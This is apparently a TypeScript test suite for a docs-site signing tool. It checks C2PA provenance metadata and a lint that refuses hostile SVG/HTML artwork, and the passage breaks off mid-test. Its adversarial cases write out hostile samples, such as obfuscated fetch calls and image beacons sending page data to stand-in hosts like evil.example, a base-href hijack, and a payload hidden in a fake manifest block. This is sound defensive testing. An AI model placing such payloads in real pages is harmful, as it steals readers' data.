// SPDX-License-Identifier: MPL-2.0
/**
 * The docs art bank's gate — `scripts/sign-docs-art.ts` (plan 105 §6).
 *
 * Two things are being pinned here, and they fail in opposite directions.
 *
 * THE LINT is a trust boundary: these artifacts are model-written programs that get
 * inlined into a docs page and run with the page's privileges. So the refusal tests
 * are adversarial on purpose — the obvious `fetch(`, and then the same call wearing a
 * bracket-indexed global, a split string literal and an HTML entity. A lint that only
 * catches the tidy form is a lint that reads like protection and isn't. It is still
 * only a denylist (human curation is the final filter, per plan §10), so what these
 * tests defend is the floor: nothing gets in by ACCIDENT, and anything deliberate has
 * to look deliberate in the diff.
 *
 * THE CLAIM is an honesty boundary. §18.28.3's table says `digitalCreation` means no
 * trained model was invoked and the AI-disclosure assertion is NOT attached; every
 * other row names a model. So the pipeline must refuse a meta that claims both, must
 * attach the disclosure when a model is named, and must attach NOTHING when one is
 * not — over-claiming and under-claiming are both failures, and both are pinned.
 *
 * Fixtures: `tests/fixtures/docs-art/` (see its README — their metas are true, which
 * is why they read `trainedAlgorithmicMedia`, not the `digitalCreation` a hand-typed
 * file would carry). Every run happens in a temp copy; the fixture tree is read-only.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, cpSync, rmSync, readFileSync, writeFileSync, existsSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  signDocsArt, lintArtSource, validateArtMeta, stripArtManifest, artC2paOpts, artDims,
  artBindingState, normalizeForLint, ART_BUDGETS, ART_SOURCE_TYPES, ART_FORMATS, ART_CREDENTIAL_DAYS,
  MOTION_GUARD_WINDOW, type ArtKind, type ArtMeta, type Violation,
} from '../scripts/sign-docs-art.ts';
import { embedC2pa, stripPlacedArmorLine, C2PA_FRAGMENT_PROFILE } from '../engine/src/c2pa-containers.ts';
import { stripArtForInline } from '../docs/docs-art.ts';
import { extractC2paStore, parseC2paStore, decodeCbor } from '../engine/src/c2pa-extract.ts';
import { verifyC2pa } from '../engine/src/c2pa-verify.ts';
import { readShotProvenance } from '../docs/shot-provenance.ts';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const FIX = join(ROOT, 'tests/fixtures/docs-art');
const enc = new TextEncoder();
const dec = new TextDecoder();

// ── staging ───────────────────────────────────────────────────────────────────

/** A temp `docs/` with `mastheads/` + `figures/`, populated from the fixture banks. */
function stage(files: { from: 'ok' | 'refuse'; kind: ArtKind; name: string }[]): string {
  const dir = mkdtempSync(join(tmpdir(), 'lolly-docs-art-'));
  for (const k of ['mastheads', 'figures']) mkdirSync(join(dir, k), { recursive: true });
  for (const f of files) {
    const sub = f.kind === 'masthead' ? 'mastheads' : 'figures';
    const src = join(FIX, f.from, sub, f.name);
    cpSync(src, join(dir, sub, f.name));
    const meta = `${f.name.slice(0, f.name.lastIndexOf('.'))}.meta.json`;
    if (existsSync(join(FIX, f.from, sub, meta))) cpSync(join(FIX, f.from, sub, meta), join(dir, sub, meta));
  }
  return dir;
}

const CLEAN: Parameters<typeof stage>[0] = [
  { from: 'ok', kind: 'masthead', name: 'test-band.svg' },
  { from: 'ok', kind: 'masthead', name: 'test-fragment.html' },
  { from: 'ok', kind: 'figure', name: 'test-page-chart.svg' },
];

const silent = { log: () => {} };
const read = (dir: string, rel: string): Uint8Array => new Uint8Array(readFileSync(join(dir, rel)));
const fixture = (from: 'ok' | 'refuse', kind: ArtKind, name: string): string =>
  readFileSync(join(FIX, from, kind === 'masthead' ? 'mastheads' : 'figures', name), 'utf-8');

const rules = (v: Violation[]): string[] => [...new Set(v.map((x) => x.rule))].sort();
const ctx = (format = 'svg', kind: ArtKind = 'masthead') =>
  ({ file: 'x', kind, format, budget: ART_BUDGETS[kind] });

/** The store's assertion labels + the first action, straight out of the JUMBF. */
function claimFacts(bytes: Uint8Array): { labels: string[]; created: Map<unknown, unknown> | undefined; disclosure: Map<unknown, unknown> | undefined } {
  const found = extractC2paStore(bytes);
  assert.ok(found, 'no manifest store in the signed bytes');
  const parts = parseC2paStore(found.store);
  const labels = parts.assertions.map((a) => a.label);
  let created: Map<unknown, unknown> | undefined;
  let disclosure: Map<unknown, unknown> | undefined;
  for (const a of parts.assertions) {
    if (a.label.startsWith('c2pa.actions')) {
      const actions = (decodeCbor(a.content) as Map<unknown, unknown>).get('actions') as unknown[];
      created = actions[0] as Map<unknown, unknown>;
    } else if (a.label.startsWith('c2pa.ai-disclosure')) {
      disclosure = decodeCbor(a.content) as Map<unknown, unknown>;
    }
  }
  return { labels, created, disclosure };
}

// ── meta.json: the provenance contract ────────────────────────────────────────

test('meta: the full shape is accepted and unknown keys are not', () => {
  const good = {
    generator: { name: 'Claude Code', version: 'opus-5' },
    model: {
      name: 'Claude Opus 5', identifier: 'claude-opus-5',
      vendor: 'Anthropic', region: { city: 'London', state: 'England', country: 'United Kingdom' },
    },
    oversight: 'prompt_guided', source: 'trainedAlgorithmicMedia', locale: 'pt-BR',
    author: { name: 'Andy Fitzsimon', email: 'andy@example.com' },
  };
  assert.ok('meta' in validateArtMeta(good));
  // A typo'd key that was quietly ignored would ship a credential saying less than
  // its author believed — the one failure mode a hand-authored sidecar has. This
  // must hold at every level, not only the top.
  const typo = validateArtMeta({ ...good, overisght: 'prompt_guided' });
  assert.ok('problems' in typo && typo.problems.some((p) => p.includes('overisght')));
  const modelTypo = validateArtMeta({ ...good, model: { ...good.model, vender: 'Anthropic' } });
  assert.ok('problems' in modelTypo && modelTypo.problems.some((p) => p.includes('unknown model key "vender"')));
  const regionTypo = validateArtMeta({ ...good, model: { ...good.model, region: { country: 'UK', provice: 'x' } } });
  assert.ok('problems' in regionTypo && regionTypo.problems.some((p) => p.includes('unknown model.region key "provice"')));
  const authorTypo = validateArtMeta({ ...good, author: { name: 'A', emial: 'x@y.z' } });
  assert.ok('problems' in authorTypo && authorTypo.problems.some((p) => p.includes('unknown author key "emial"')));
  // region requires a country; author requires a name.
  assert.ok('problems' in validateArtMeta({ ...good, model: { ...good.model, region: { city: 'London' } } }));
  assert.ok('problems' in validateArtMeta({ ...good, author: { email: 'x@y.z' } }));
});

test('meta: a human author is allowed even with digitalCreation (it is not a model claim)', () => {
  // §18.28.3 forbids a MODEL beside digitalCreation, but a person directing a
  // hand-made artifact is an ordinary, honest fact — refusing it would be wrong.
  const r = validateArtMeta({
    generator: { name: 'A human, in a text editor' }, source: 'digitalCreation',
    author: { name: 'Andy Fitzsimon' },
  });
  assert.ok('meta' in r);
});

test('meta: generator and source are required, and their values are checked', () => {
  const problems = (raw: unknown): string[] => {
    const r = validateArtMeta(raw);
    return 'problems' in r ? r.problems : [];
  };
  assert.ok(problems({ source: 'digitalCreation' }).some((p) => p.includes('generator.name')));
  assert.ok(problems({ generator: { name: 'x' } }).some((p) => p.includes('source is required')));
  assert.ok(problems({ generator: { name: 'x' }, source: 'photograph' }).some((p) => p.includes('source is required')));
  assert.ok(problems({ generator: { name: 'x' }, source: 'digitalCreation', locale: 'not a tag' }).some((p) => p.includes('BCP-47')));
  assert.ok(problems({ generator: { name: 'x' }, source: 'trainedAlgorithmicMedia', oversight: 'supervised' })
    .some((p) => p.includes('oversight must be one of')));
  assert.ok(problems({ generator: { name: 'x' }, source: 'trainedAlgorithmicMedia', model: { identifier: 'x' } })
    .some((p) => p.includes('model.name')));
  assert.deepEqual(problems([]), ['meta.json must be a JSON object']);
});

test('meta: digitalCreation + a model is a contradiction, refused rather than resolved', () => {
  // §18.28.3, verbatim: digitalCreation ⇒ "No trained model invoked; AI Model
  // Disclosure assertion is not attached". Dropping the model silently would
  // under-claim the AI involvement; keeping it would contradict the source type.
  // Only the author knows which half is true, so only the author can fix it.
  const r = validateArtMeta(JSON.parse(readFileSync(join(FIX, 'refuse/mastheads/contradictory-meta.meta.json'), 'utf-8')));
  assert.ok('problems' in r);
  assert.ok(r.problems.some((p) => p.includes('digitalCreation') && p.includes('§18.28.3')));
  const withOversight = validateArtMeta({ generator: { name: 'x' }, source: 'digitalCreation', oversight: 'human_validated' });
  assert.ok('problems' in withOversight && withOversight.problems.some((p) => p.includes('not applicable')));
});

test('meta: the three source types are the IPTC/C2PA URIs verbatim', () => {
  // Spec-literal, not derived: a typo here would produce a credential that reads as
  // "unknown source" to every other implementation while looking right in our UI.
  assert.deepEqual(ART_SOURCE_TYPES, {
    trainedAlgorithmicMedia: 'http://cv.iptc.org/newscodes/digitalsourcetype/trainedAlgorithmicMedia',
    digitalCreation: 'http://cv.iptc.org/newscodes/digitalsourcetype/digitalCreation',
    compositeWithTrainedAlgorithmicMedia: 'http://cv.iptc.org/newscodes/digitalsourcetype/compositeWithTrainedAlgorithmicMedia',
  });
});

// ── lint: the clean side ──────────────────────────────────────────────────────

test('lint: the clean fixtures pass, in both carriers and both banks', () => {
  assert.deepEqual(lintArtSource(fixture('ok', 'masthead', 'test-band.svg'), ctx('svg')), []);
  assert.deepEqual(lintArtSource(fixture('ok', 'masthead', 'test-fragment.html'), ctx(C2PA_FRAGMENT_PROFILE.format)), []);
  assert.deepEqual(lintArtSource(fixture('ok', 'figure', 'test-page-chart.svg'), ctx('svg', 'figure')), []);
});

test('lint: xmlns URLs are identifiers, not references', () => {
  // Every SVG on earth declares http://www.w3.org/2000/svg. A URL rule that cannot
  // tell a namespace from a reference refuses the entire format.
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10"><rect width="10" height="10"/></svg>';
  assert.deepEqual(lintArtSource(svg, ctx()), []);
  const doctyped = '<?xml version="1.0"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n' + svg;
  assert.deepEqual(lintArtSource(doctyped, ctx()), []);
});

// ── lint: the adversarial side ────────────────────────────────────────────────

test('lint: the plain exfil fixture is refused, and says why', () => {
  const v = lintArtSource(fixture('refuse', 'masthead', 'exfil-plain.svg'), ctx());
  assert.ok(rules(v).includes('network'));
  assert.ok(rules(v).includes('external-url'));
  assert.ok(v.some((x) => x.message.includes('fetch') && x.line !== null), 'a violation must point at a line');
});

test('lint: the same call in three disguises is still refused', () => {
  // window['fe'+'tch'] with an entity in the path. Each disguise is undone by the
  // normalizer; the bracket-indexed global is refused on its own shape as well, so
  // the rule holds even for an obfuscation the normalizer has not seen.
  const v = lintArtSource(fixture('refuse', 'masthead', 'exfil-hidden.html'), ctx(C2PA_FRAGMENT_PROFILE.format));
  assert.ok(rules(v).includes('network'), 'the concatenated fetch must be found');
  assert.ok(rules(v).includes('dynamic-code'), 'the bracket-indexed global is a violation in its own right');
  assert.ok(v.some((x) => x.message.includes('after decoding')), 'a normalized hit must say it was normalized');
});

test('lint: an adversarial sweep — every one of these is refused', () => {
  const wrap = (body: string): string =>
    `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><script>${body}</script></svg>`;
  const cases: [string, string][] = [
    ['storage', wrap("localStorage.setItem('a', 1)")],
    ['storage', wrap("document.cookie = 'a=1'")],
    ['storage', wrap('indexedDB.open("x")')],
    ['storage', wrap('caches.open("x")')],
    ['dynamic-code', wrap('eval("1+1")')],
    ['dynamic-code', wrap('new Function("return 1")()')],
    ['dynamic-code', wrap('({}).constructor.constructor("return 1")()')],
    ['dynamic-code', wrap('setTimeout("doThing()", 10)')],
    ['dynamic-code', wrap('atob("ZmV0Y2g=")')],
    ['dynamic-code', wrap('import("./x.js")')],
    ['dynamic-code', wrap('self["ale" + "rt"](1)')],
    ['network', wrap('new WebSocket("wss://example.invalid")')],
    ['network', wrap('new EventSource("/stream")')],
    ['network', wrap('navigator.sendBeacon("/log", "x")')],
    ['network', wrap('new XMLHttpRequest().open("GET", "/x")')],
    ['isolation', wrap('parent.postMessage("x", "*")')],
    ['isolation', wrap('new Worker("w.js")')],
    ['device', wrap('navigator.clipboard.writeText("x")')],
    // The same-origin beacon: no denied identifier, no absolute URL, still a GET
    // carrying page data off the artwork. The runtime-assignment rules are what
    // stand between this shape and the bank.
    ['external-resource', wrap('var i = new Image(); i.src = "/log?t=" + document.title;')],
    ['external-resource', wrap('el.setAttribute("href", "/log?t=" + document.title)')],
    ['isolation', wrap('location.href = "/elsewhere"')],
    ['isolation', wrap('history.pushState({}, "", "/elsewhere")')],
    ['isolation', wrap('window.open("/elsewhere")')],
    ['embedding', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><foreignObject><iframe src="/x"></iframe></foreignObject></svg>'],
    ['embedding', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect srcdoc="&lt;script&gt;"/></svg>'],
    ['xml', '<!DOCTYPE svg [<!ENTITY x "boom">]><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"/>'],
    ['dynamic-code', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><a href="javascript:alert(1)"><rect/></a></svg>'],
    ['external-url', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><image href="https://example.invalid/a.png"/></svg>'],
    ['external-resource', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><use href="/other.svg#a"/></svg>'],
    ['external-resource', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><style>@import "x.css";</style></svg>'],
    ['external-resource', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><style>.a{fill:url(bg.png)}</style></svg>'],
    ['external-url', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><image href="//example.invalid/a.png"/></svg>'],
    ['external-resource', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><image href="data:text/html;base64,PHNjcmlwdD4="/></svg>'],
    ['viewbox', '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>'],
    ['binary', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"></svg>'],
  ];
  for (const [rule, src] of cases) {
    const v = lintArtSource(src, ctx());
    assert.ok(v.length, `NOT REFUSED: ${src.slice(0, 90)}`);
    assert.ok(rules(v).includes(rule), `${src.slice(0, 90)} → expected rule ${rule}, got ${rules(v).join(',')}`);
  }
});

// ── lint: the bypasses an adversarial pass found, each pinned by the shape that
// got through. Every case below was run through the REAL pipeline (signDocsArt),
// signed clean, and left a valid credential on a hostile file. The pattern under
// most of them was one defect wearing different clothes: the reference rules
// parsed a different language from the denylists — quoted values only, raw text
// only — so "write the reference in a dialect the reference rules don't read"
// was a general bypass. See plans/105-m345/findings-trust-gate.md.

test('lint: an UNQUOTED attribute value is a reference like any other', () => {
  // HTML permits unquoted values, and the reference rules read quotes only; the
  // protocol-relative backstop needs a quote or paren right before the `//`, and
  // an unquoted attribute puts `=` there. All three rules missed the same bytes.
  const cases: [string, string][] = [
    // <base> is the worst of the family: it re-points every relative URL on the
    // whole docs page, not just the artifact's.
    ['external-resource', '<div class=x></div>\n<base href=//evil.example/>'],
    ['external-resource', '<img src=//evil.example/b?d=leak width=1 height=1 alt="">'],
    ['external-resource', '<form action=//evil.example/c method=post><button>go</button></form>'],
    ['external-resource', '<a href=# ping=//evil.example/click>x</a>'],
    // …and the entity-encoded spelling, which is why teaching the grammar about
    // unquoted values is only half the fix: the rules run over the normalized
    // view too, exactly as the denylists always did.
    ['external-resource', '<img src=&#47;&#47;evil.example/b alt="">'],
  ];
  for (const [rule, src] of cases) {
    const v = lintArtSource(src, ctx(C2PA_FRAGMENT_PROFILE.format));
    assert.ok(rules(v).includes(rule), `NOT REFUSED: ${src.slice(0, 70)} → ${rules(v).join(',') || 'nothing'}`);
  }
  // The SVG twin of the same hole.
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><image xlink:href=//evil.example/p.png /></svg>';
  assert.ok(rules(lintArtSource(svg, ctx())).includes('external-resource'));
});

test('lint: a root-relative href is navigation only where href MEANS navigation', () => {
  // `href` is not only a navigation attribute: on <link>, and on SVG2 <script>,
  // it is a subresource load. The blanket exemption waved those through, so
  // `<script href="/evil.js">` signed while `<script xlink:href="/evil.js">` was
  // refused — one load, two spellings, two verdicts.
  const loads = [
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><script href="/evil.js"></script><rect/></svg>',
    '<link rel="stylesheet" href="/x.css"><div>a</div>',
    '<link rel="preload" as="script" href="/x.js"><div>a</div>',
  ];
  for (const src of loads) {
    const v = lintArtSource(src, ctx(src.startsWith('<svg') ? 'svg' : C2PA_FRAGMENT_PROFILE.format));
    assert.ok(rules(v).includes('external-resource'), `NOT REFUSED: ${src.slice(0, 70)}`);
  }
  // The complement: a link the reader can click is still ordinary content.
  assert.deepEqual(lintArtSource('<p><a href="/info/c2pa.html">Read more</a></p>', ctx(C2PA_FRAGMENT_PROFILE.format)), []);
});

test('lint: the manifest strip is not a hiding place — and --check cannot pass a hostile file', async () => {
  // The strip ran before the lint, and its armour pattern was lazy across lines,
  // so a fake `-----BEGIN` and any later `-----END` hid everything between them
  // from every rule AND from the budget. A real signing run happened to destroy
  // the payload (it rewrites the file from the stripped source); `--check`, the
  // CI gate, reported zero violations and left the file exactly as it was — the
  // read-only mode was the unsafe one.
  const hidden = '<div class=i1></div>\n'
    + '<!-- -----BEGIN C2PA MANIFEST----- data:application/c2pa;base64,AA\n'
    + '<img src="//evil.example/b?d=leak" width=1 height=1 alt="">\n'
    + '<script>window[\'fe\'+\'tch\'](\'//evil.example/x\');document.cookie=\'x\';eval(\'1\');</script>\n'
    + '-----END C2PA MANIFEST----- -->\n';
  assert.equal(stripArtManifest(hidden, C2PA_FRAGMENT_PROFILE.format), hidden, 'nothing is removed');
  const v = lintArtSource(hidden, ctx(C2PA_FRAGMENT_PROFILE.format));
  for (const rule of ['manifest', 'external-url', 'storage', 'dynamic-code', 'network']) {
    assert.ok(rules(v).includes(rule), `${rule} must fire; got ${rules(v).join(',')}`);
  }
  // Budget evasion by the same route: 200 KB inside a fake block measured as 0.
  const fat = `<div class=b></div>\n<!-- -----BEGIN C2PA MANIFEST----- data:application/c2pa;base64,AA\n${'x'.repeat(200 * 1024)}\n-----END C2PA MANIFEST----- -->\n`;
  assert.ok(rules(lintArtSource(fat, ctx(C2PA_FRAGMENT_PROFILE.format))).includes('budget'));
  // …and end to end, in the mode that writes nothing.
  const dir = mkdtempSync(join(tmpdir(), 'lolly-docs-art-'));
  mkdirSync(join(dir, 'mastheads'), { recursive: true });
  writeFileSync(join(dir, 'mastheads', 'sneak.html'), hidden);
  writeFileSync(join(dir, 'mastheads', 'sneak.meta.json'), JSON.stringify({ generator: { name: 'H' }, source: 'digitalCreation' }));
  const run = await signDocsArt({ docsDir: dir, check: true, ...silent });
  assert.ok(run.violations.length, '--check refuses it');
  assert.deepEqual(run.wouldSign, [], 'and would sign nothing');
  rmSync(dir, { recursive: true, force: true });
});

test('lint: honest content that DOCUMENTS the armour format survives the strip', () => {
  // The other end of the same defect: the lazy pattern deleted the span between a
  // quoted BEGIN and a later END, so a figure explaining §A.9 — on a docs site
  // whose subject is C2PA — silently lost a paragraph at sign time.
  const doc = '<p>A signed CSS file ends with one line:</p>\n'
    + '<pre>/*! -----BEGIN C2PA MANIFEST----- data:application/c2pa;base64,AAAA -----END C2PA MANIFEST----- */</pre>\n'
    + '<p>Everything above that line is hashed.</p>\n';
  const kept = stripArtManifest(doc, C2PA_FRAGMENT_PROFILE.format);
  assert.equal(kept, doc, 'not one byte of the artifact is removed');
  // It is still refused — a second block would make the file unreadable (§A.9.3)
  // — but as a stated violation the author can act on, not as a silent edit.
  assert.ok(rules(lintArtSource(kept, ctx(C2PA_FRAGMENT_PROFILE.format))).includes('manifest'));
});

test('lint: obfuscation the normalizer undoes, and the global aliases it cannot', () => {
  // `window['fe'+'tch']` was refused three ways; `String.fromCharCode(...)` plus
  // `document.defaultView` — the same call, one layer further out — signed clean.
  const src = '<div class=a2></div>\n<script>\n(function () {\n'
    + '  var w = document.defaultView;\n'
    + '  var n = String.fromCharCode(102, 101, 116, 99, 104);\n'
    + '  w[n](\'/log?d=\' + document.title);\n})();\n</script>\n';
  const v = lintArtSource(src, ctx(C2PA_FRAGMENT_PROFILE.format));
  assert.ok(rules(v).includes('network'), 'the char-code fetch is decoded and refused');
  assert.ok(rules(v).includes('dynamic-code'), 'and the window alias is a violation in its own right');
  assert.equal(normalizeForLint('String.fromCharCode(102,101,116,99,104)'), 'fetch');
  assert.equal(normalizeForLint('String.fromCodePoint(0x66)'), 'String.fromCodePoint(0x66)', 'only literal decimals are decoded — nothing is guessed');
});

test('lint: markup and CSS assembled at runtime, and static ESM', () => {
  const cases: [string, string][] = [
    // A stylesheet built from split strings: the URL exists only after the
    // concatenation, so no reference rule reading the raw text can see it.
    ['dynamic-code', '<script>var s = document.createElement(\'style\'); s.textContent = \'.b{background-image:ur\' + \'l(/beacon?d=\' + document.title + \')}\'; document.head.appendChild(s);</script>'],
    ['dynamic-code', '<script>document.write(\'<img src=//evil.example/b>\');</script>'],
    ['dynamic-code', '<script>el.innerHTML = \'<img src=//evil.example/b?d=\' + document.title + \'>\';</script>'],
    // Static ESM is a network load the `import(` rule never named.
    ['dynamic-code', '<script type="module">\nimport { paint } from \'/info/mastheads/helper.mjs\';\npaint();\n</script>'],
    // Navigation without a line of script.
    ['isolation', '<div class=h2></div>\n<meta http-equiv="refresh" content="5;url=//evil.example/steal">'],
  ];
  for (const [rule, src] of cases) {
    const v = lintArtSource(src, ctx(C2PA_FRAGMENT_PROFILE.format));
    assert.ok(rules(v).includes(rule), `NOT REFUSED: ${src.slice(0, 70)} → ${rules(v).join(',') || 'nothing'}`);
  }
  // The complement: writing a NUMBER into a label is what art does all day.
  assert.deepEqual(lintArtSource('<div id="n"></div>\n<script>document.getElementById(\'n\').textContent = String(42);</script>', ctx(C2PA_FRAGMENT_PROFILE.format)), []);
});

test('lint: same-document and inlined references are allowed', () => {
  // The complement of the sweep: refusing these would make ordinary SVG unbankable,
  // and a gate nobody can pass gets switched off.
  const ok = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
    + '<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>'
    + '<rect fill="url(#g)" width="10" height="10"/><use href="#g"/>'
    + '<image href="data:image/png;base64,iVBORw0KGgo="/>'
    + '<a href="/info/exporting.html"><rect/></a></svg>';
  assert.deepEqual(lintArtSource(ok, ctx()), []);
});

test('lint: a `>` inside an attribute value does not fake a missing viewBox', () => {
  // A false refusal in a trust gate is how the gate gets worked around, so the tag
  // scan is quote-aware — a figure whose label reads "a > b" is ordinary content.
  const svg = '<svg xmlns="http://www.w3.org/2000/svg" aria-label="throughput a > b" viewBox="0 0 10 10"><rect/></svg>';
  assert.deepEqual(lintArtSource(svg, ctx()), []);
  assert.deepEqual(artDims(svg), { width: 10, height: 10 });
});

test('lint: an HTML artifact is a fragment — a whole document is refused', () => {
  const doc = '<!doctype html><html><head><title>x</title></head><body><svg viewBox="0 0 1 1"/></body></html>';
  assert.ok(rules(lintArtSource(doc, ctx(C2PA_FRAGMENT_PROFILE.format))).includes('shape'));
  assert.ok(rules(lintArtSource('<p>no svg here</p>', ctx('svg'))).includes('shape'));
});

// ── lint: the motion contract ─────────────────────────────────────────────────

test('motion: an unguarded rAF loop is refused twice — no opt-out, and no off switch', () => {
  const v = lintArtSource(fixture('refuse', 'masthead', 'unguarded-motion.html'), ctx(C2PA_FRAGMENT_PROFILE.format));
  const motion = v.filter((x) => x.rule === 'motion');
  assert.ok(motion.some((x) => x.message.includes('prefers-reduced-motion')));
  assert.ok(motion.some((x) => x.message.includes('self-suspend')));
});

test('motion: the guard has to be near the loop, not merely in the file', () => {
  const far = ['// prefers-reduced-motion is handled somewhere else entirely',
    ...Array.from({ length: MOTION_GUARD_WINDOW + 5 }, (_, i) => `var pad${i} = ${i};`),
    'requestAnimationFrame(tick); document.addEventListener("visibilitychange", sync);'].join('\n');
  assert.ok(lintArtSource(`<div/><script>${far}</script>`, ctx(C2PA_FRAGMENT_PROFILE.format))
    .some((x) => x.rule === 'motion' && x.message.includes('within')));
  const near = 'var reduce = matchMedia("(prefers-reduced-motion: reduce)");\n'
    + 'if (!reduce.matches) requestAnimationFrame(tick);\n'
    + 'document.addEventListener("visibilitychange", sync);';
  assert.deepEqual(lintArtSource(`<div/><script>${near}</script>`, ctx(C2PA_FRAGMENT_PROFILE.format)), []);
});

test('motion: self-running CSS animation needs the query; a hover transition does not', () => {
  const anim = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><style>@keyframes s{to{opacity:1}}.a{animation:s 2s}</style><rect class="a"/></svg>';
  assert.ok(rules(lintArtSource(anim, ctx())).includes('motion'));
  const guarded = anim.replace('<style>', '<style>@media (prefers-reduced-motion: no-preference){.a{opacity:.5}}');
  assert.deepEqual(lintArtSource(guarded, ctx()), []);
  // A transition only runs when the reader does something; requiring a guard on it
  // would make the rule noise, and noisy rules get silenced.
  const hover = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><style>.a{transition:opacity .2s}</style><rect class="a"/></svg>';
  assert.deepEqual(lintArtSource(hover, ctx()), []);
});

test('motion: a comment is not a guard', () => {
  // Every other rule here scans comments deliberately. A guard is the opposite
  // kind of claim — it has to be code that runs — and one comment saying the
  // artwork "honours prefers-reduced-motion and suspends on visibilitychange"
  // satisfied BOTH halves of the contract while the rAF loop below never stopped.
  const src = '<div id="g1"></div>\n<script>\n'
    + '/* Motion policy: this artwork honours prefers-reduced-motion and\n'
    + '   suspends on visibilitychange. */\n'
    + '(function () {\n  var n = document.getElementById(\'g1\'); var t = 0;\n'
    + '  function tick() { t += 1; n.style.opacity = String(0.5 + Math.sin(t/30)/2); requestAnimationFrame(tick); }\n'
    + '  requestAnimationFrame(tick);\n})();\n</script>\n';
  const motion = lintArtSource(src, ctx(C2PA_FRAGMENT_PROFILE.format)).filter((x) => x.rule === 'motion');
  assert.ok(motion.some((x) => x.message.includes('prefers-reduced-motion')), 'the fake guard does not count');
  assert.ok(motion.some((x) => x.message.includes('self-suspend')), 'nor the fake self-suspend');
  // Line numbers still point at the real line: the comment blanking preserves them.
  assert.ok(motion.some((x) => x.line === 7), `expected the loop's own line, got ${motion.map((x) => x.line).join(',')}`);
  // An HTML comment is not a guard either.
  const html = src.replace('/* Motion policy:', '<!-- Motion policy:').replace('visibilitychange. */', 'visibilitychange. -->');
  assert.ok(lintArtSource(html, ctx(C2PA_FRAGMENT_PROFILE.format)).some((x) => x.rule === 'motion'));
});

test('motion: an INVERTED reduced-motion query is not a guard', () => {
  // "Mentions prefers-reduced-motion somewhere" accepted a `reduce` block full of
  // animation beside unconditional animation — motion for everyone, plus extra
  // motion for the readers who asked for less.
  const inverted = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><style>\n'
    + '@media (prefers-reduced-motion: reduce) { .spin { animation: spin 1s linear infinite } }\n'
    + '.spin { animation: spin 1s linear infinite }\n'
    + '@keyframes spin { to { transform: rotate(360deg) } }\n'
    + '</style><rect class="spin" width="10" height="10"/></svg>\n';
  const v = lintArtSource(inverted, ctx());
  assert.ok(v.some((x) => x.rule === 'motion' && x.message.includes('no `prefers-reduced-motion` guard')));
  assert.ok(v.some((x) => x.rule === 'motion' && x.message.includes('INSIDE')));
  // The second honest shape — motion on by default, switched OFF for `reduce` —
  // has to keep passing, or the rule only permits one house style.
  const off = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><style>\n'
    + '.spin { animation: spin 1s linear infinite }\n'
    + '@keyframes spin { to { transform: rotate(360deg) } }\n'
    + '@media (prefers-reduced-motion: reduce) { .spin { animation: none } }\n'
    + '</style><rect class="spin" width="10" height="10"/></svg>\n';
  assert.deepEqual(lintArtSource(off, ctx()), []);
});

// ── lint: budgets ─────────────────────────────────────────────────────────────

test('budget: the numbers are the charter\'s, and a breach is refused', () => {
  assert.deepEqual(ART_BUDGETS, { masthead: 48 * 1024, figure: 128 * 1024 });
  const filler = '  <rect x="0" y="0" width="1" height="1" fill="currentColor" opacity=".01" />\n';
  const big = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">\n${filler.repeat(900)}</svg>`;
  assert.ok(Buffer.byteLength(big) > ART_BUDGETS.masthead && Buffer.byteLength(big) < ART_BUDGETS.figure);
  assert.ok(rules(lintArtSource(big, ctx('svg', 'masthead'))).includes('budget'));
  // The same file is within a figure's larger allowance — the budget is per bank.
  assert.deepEqual(lintArtSource(big, ctx('svg', 'figure')), []);
});

test('normalizeForLint undoes entities, escapes and concatenation — nested ones too', () => {
  for (const hidden of ['&#102;etch', '&#x66;etch', '&amp;#102;etch', '\\x66etch', '\\u0066etch', "'fe' + 'tch'"]) {
    assert.ok(normalizeForLint(hidden).includes('fetch'), `not normalized: ${hidden}`);
  }
  // Two decode rounds. `&amp;amp;#102;etch` needs three and slips through — the
  // honest limit of any normalizer, and exactly why the shape rules (bracket-indexed
  // globals, `.constructor`, string-bodied timers) exist alongside it: they need no
  // decoding at all, so they catch what the decoder cannot reach.
  assert.equal(normalizeForLint('&amp;amp;#102;etch').includes('fetch'), false);
});

// ── strip: the inverse of the placer ──────────────────────────────────────────

test('strip: signing then stripping returns the exact source bytes', async () => {
  // This is what makes the budget and the lint measure the SOURCE: a signed artifact
  // must lint identically to the file it was made from, or the first signature would
  // shrink the budget by ~10 KB and hand the denylist a base64 blob to scan.
  const cases: [string, string][] = [
    ['svg', fixture('ok', 'masthead', 'test-band.svg')],
    // an artifact that already has its own <metadata> — the placer reuses it
